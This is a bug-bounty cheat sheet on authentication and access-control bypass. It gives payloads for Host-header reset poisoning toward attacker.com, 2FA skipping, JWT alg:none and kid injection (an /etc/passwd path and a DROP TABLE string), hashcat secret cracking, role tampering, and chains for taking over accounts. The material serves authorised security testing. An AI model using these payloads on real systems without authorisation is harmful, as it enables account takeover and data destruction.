# Authentication & Authorization Bypass

> **Severity:** P1–P2  
> **Frequency:** Common  
> **Payout range:** $500–$10,000+

---

## Auth vs AuthZ

- **Authentication (AuthN):** Proving who you are (login)
- **Authorization (AuthZ):** What you're allowed to do (access control)

Both break differently. Test both independently.

---

## Authentication Flaws

### Password Reset Flaws
```
# Host header injection (reset link goes to attacker)
Host: attacker.com
X-Forwarded-Host: attacker.com

# Token predictability (sequential, time-based)
# Request reset → token = base64(email + timestamp)

# Token not invalidated after use
# Use same reset token twice

# No expiry on reset tokens
# Old token works days/weeks later

# Reset link is sent but original password still works simultaneously

# User enumeration via response difference
"Email sent"        → account exists
"Email not found"   → account doesn't exist
→ use for targeted attacks or report as info disclosure
```

### 2FA / MFA Bypass
```
# Direct URL access after first factor
POST /login → redirect to /verify-2fa
→ directly request /dashboard without completing 2FA

# Code not invalidated after failed attempts (brute force)
# Codes 000000–999999 = only 1M combinations, possible in minutes without rate limiting

# Race condition — submit code in parallel requests

# Backup codes too predictable

# Response manipulation
{"mfa_required": true}  →  {"mfa_required": false}

# SMS code exposed in API response (check the /send-otp response body!)
```

### Session Management
```
# Session not invalidated on logout
# Save session cookie → logout → use old cookie

# Session not invalidated on password change

# Session fixation
# Set your session ID, get victim to login, use their authenticated session

# Predictable session tokens
# Sequential IDs, base64(username:timestamp)

# JWT: alg:none attack
# Decode header → change alg to "none" → remove signature → re-encode
eyJhbGciOiJub25lIn0.{payload}.

# JWT: weak secret brute force
# hashcat -a 0 -m 16500 token.txt wordlist.txt

# JWT: kid header injection
# {"kid": "../../etc/passwd"} → use file content as secret
# {"kid": "'; DROP TABLE keys; --"} → SQLi via kid
```

---

## Authorization (Access Control) Flaws

### Vertical Privilege Escalation
Access functions above your privilege level:
```
# Role parameter manipulation
{"role": "user"}  →  {"role": "admin"}

# Admin endpoints without auth check
/admin/users  → try without admin session
/api/admin/   → might not check role

# Mass assignment
POST /api/users/me
{"name": "Updated", "role": "admin"}   ← add extra field
```

### Horizontal Privilege Escalation
Access another user's data at same privilege level → IDOR (see IDOR.md)

### Function-Level Access Control
```
# Hidden admin features in UI → test the underlying API calls
# Methods differ: user can GET, admin can POST
# Check OPTIONS response for allowed methods
```

---

## Common Test Cases

### Authentication Test Checklist
- [ ] Password reset token security (expiry, predictability, reuse)
- [ ] 2FA bypass (direct access, brute force, race condition)
- [ ] Session token security (entropy, expiry, invalidation)
- [ ] Default/weak credentials on admin panels
- [ ] Login brute force (no lockout, no CAPTCHA)
- [ ] User enumeration (timing, response difference)
- [ ] "Remember me" token security
- [ ] OAuth flow security (see OAuth.md)

### Authorization Test Checklist
- [ ] Access admin functions as regular user
- [ ] Access other users' objects (IDOR)
- [ ] HTTP method change to bypass auth
- [ ] Role parameter in request body
- [ ] Missing auth check on API vs UI
- [ ] GraphQL field-level authorization

---

## Account Takeover Chains

These single bugs rarely pay much alone — but chained, they become P1:

```
Open Redirect + Password Reset = ATO
→ Reset email goes to attacker.com via Host header injection

XSS + Session Cookie = ATO
→ Steal session via XSS on httpOnly=false cookie

IDOR on Password Reset = ATO
→ Trigger reset for victim's email via their user ID

CSRF on Email Change = ATO
→ Change victim's email → then reset password
```

---

## Proof of Concept

For auth bypass:
1. Document the normal protected flow
2. Show the bypass technique step by step
3. Demonstrate access to protected resource
4. Show what data/functions are now accessible

---

## Resources

- [PortSwigger Auth Labs](https://portswigger.net/web-security/authentication)
- [PortSwigger Access Control Labs](https://portswigger.net/web-security/access-control)
- [HackTricks - Authentication](https://book.hacktricks.xyz/pentesting-web/login-bypass)
